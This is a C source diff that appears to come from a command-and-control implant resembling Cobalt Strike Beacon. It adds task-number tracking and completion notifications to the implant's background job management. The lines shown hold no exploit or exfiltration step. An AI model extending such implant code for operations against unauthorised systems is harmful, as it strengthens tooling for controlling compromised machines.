@@ -1,6 +1,7 @@
 #include <winsock2.h>
 #include <stdlib.h>
 #include <stdio.h>
+#include <string.h>
 #include <windows.h>
 #include "beacon_gate.h" /* BeaconGate: gate_* = the API with the gate in front */
 
@@ -35,6 +36,14 @@ void job_add(psh_entry * entry) {
 	/* increment our job numbers */
 	jids++;
 
+	/* a job started by a task completes the task when it ends: report that
+	 * it started */
+	if (entry->task_no != 0) {
+		task_job_claimed();
+		task_notify(CALLBACK_JOB_REGISTERED, entry->task_no, (int)entry->jid, entry->description,
+		             (int)strlen(entry->description));
+	}
+
 	/* add our entry to the end of the list, to preserve output order */
 	if (psh_list == NULL) {
 		psh_list = entry;
@@ -68,6 +77,7 @@ psh_entry * process_track(PROCESS_INFORMATION pi, HANDLE read_stdout, HANDLE wri
 	entry->pid = pi.dwProcessId;
 	entry->type = CALLBACK_OUTPUT;
 	entry->mode = JOB_MODE_BYTE;
+	entry->task_no = task_current_no();
 	_snprintf(entry->description, JOB_DESCRIPTION_LENGTH, "%s", desc);
 
 	job_add(entry);
@@ -87,6 +97,7 @@ void pipe_track(HANDLE read_stdout, DWORD pid, DWORD type, char * description, s
 	entry->pid          = pid;
 	entry->type         = type;
 	entry->mode         = mode;
+	entry->task_no = task_current_no();
 	strncpy(entry->description, description, JOB_DESCRIPTION_LENGTH);
 
 	job_add(entry);
@@ -100,6 +111,12 @@ void psh_prune_list() {
 	temp = psh_list;
 	while (temp != NULL) {
 		if (temp->status == JOB_STATUS_DEAD) {
+			/* the job ended: so does the task that started it */
+			if (temp->task_no != 0) {
+				task_notify(CALLBACK_JOB_COMPLETED, temp->task_no, (int)temp->jid, temp->description,
+				             (int)strlen(temp->description));
+				task_notify(CALLBACK_TASK_COMPLETED, temp->task_no, -1, NULL, 0);
+			}
 			/* kill our process */
 			if (temp->tag == JOB_ENTRY_PROCESS) {
 				gate_CloseHandle(temp->pi.hProcess);
@@ -171,7 +188,10 @@ void psh_poll(void(*callback)(char * buffer, int length, int type), int max) {
 		}
 
 		if (total_read > 0) {
+			/* the job's output is its task's: the callback tags the frame */
+			task_job_context(temp->task_no, temp->jid);
 			callback(bufferz, total_read, temp->type);
+			task_job_context(0, 0);
 		}
 
 		/* check if the pipe is alive or not */
